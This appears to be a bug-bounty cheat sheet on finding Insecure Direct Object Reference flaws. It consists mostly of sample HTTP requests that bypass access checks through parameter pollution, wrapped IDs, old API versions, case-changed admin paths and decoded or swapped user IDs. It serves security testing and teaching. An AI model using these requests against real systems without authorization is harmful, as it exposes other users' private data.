# Insecure Direct Object Reference (IDOR)

## **Introduction**
IDOR stands for Insecure Direct Object Reference is a security vulnerability in which a user is able to access and make changes to data of any other user present in the system.

## **How to Find**
1. Add parameters onto the endpoints for example, if there was
```
GET /api/v1/getuser
[...]
```
Try this to bypass
```
GET /api/v1/getuser?id=1234
[...]
```

2. HTTP Parameter pollution
```
POST /api/get_profile
[...]
user_id=hacker_id&user_id=victim_id
```

3. Add .json to the endpoint
```
GET /v2/GetData/1234
[...]
```
Try this to bypass
```
GET /v2/GetData/1234.json
[...]
```

4. Test on outdated API Versions
```
POST /v2/GetData
[...]
id=123
```
Try this to bypass
```
POST /v1/GetData
[...]
id=123
```

5. Wrap the ID with an array.
```
POST /api/get_profile
[...]
{"user_id":111}
```
Try this to bypass
```
POST /api/get_profile
[...]
{"id":[111]}
```

6. Wrap the ID with a JSON object
```
POST /api/get_profile
[...]
{"user_id":111}
```
Try this to bypass
```
POST /api/get_profile
[...]
{"user_id":{"user_id":111}}
```

7. JSON Parameter Pollution
```
POST /api/get_profile
[...]
{"user_id":"hacker_id","user_id":"victim_id"}
```

8. Try decode the ID, if the ID encoded using md5,base64,etc
```
GET /GetUser/dmljdGltQG1haWwuY29t
[...]
```
dmljdGltQG1haWwuY29t => victim@mail.com

9. If the website using graphql, try to find IDOR using graphql!
```
GET /graphql
[...]
```
```
GET /graphql.php?query=
[...]
```

10.  MFLAC (Missing Function Level Access Control)
```
GET /admin/profile
```
Try this to bypass
```
GET /ADMIN/profile
```

11. Try to swap uuid with number
```
GET /file?id=90ri2-xozifke-29ikedaw0d
```
Try this to bypass
```
GET /file?id=302
```

Reference: 
- [@swaysThinking](https://twitter.com/swaysThinking) and other medium writeup
